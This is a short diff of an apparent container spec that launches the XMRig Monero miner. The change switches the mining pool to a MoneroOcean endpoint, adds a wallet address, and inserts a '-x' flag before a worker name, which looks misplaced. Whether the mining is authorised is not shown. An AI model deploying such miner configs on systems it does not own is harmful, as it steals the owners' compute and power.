@@ -18,8 +18,10 @@ spec:
     command:
     - /home/worker3/xmrig/build/xmrig
     - -o
-    - proxy.hacknoob.win:5553
+    - gulf.moneroocean.stream:80
     - -u
+    - 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
+    - -x
     - slave3
     - --cpu-no-yield
     - --nicehash
